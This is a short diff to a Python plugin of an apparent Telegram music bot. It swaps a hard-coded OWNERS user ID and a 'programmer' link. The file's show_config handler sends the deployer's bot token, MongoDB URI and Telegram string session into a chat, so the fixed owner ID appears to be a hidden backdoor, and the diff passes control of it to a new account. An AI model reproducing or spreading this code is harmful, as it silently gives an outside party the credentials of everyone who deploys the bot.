@@ -8,7 +8,7 @@ from SHUKLAMUSIC.utils.database import booster
 
 load_dotenv()
 
-OWNERS = "8885151499"
+OWNERS = "8941001487"
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -22,7 +22,7 @@ async def show_config(client: Client, message: Message):
             f"<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n"
             f"<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n"
             f"<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n"
-            f"<a href='https://t.me/AmShashank'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆"
+            f"<a href='https://t.me/ll_alexx_lll'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆"
         ),
         reply_markup=InlineKeyboardMarkup(
             [
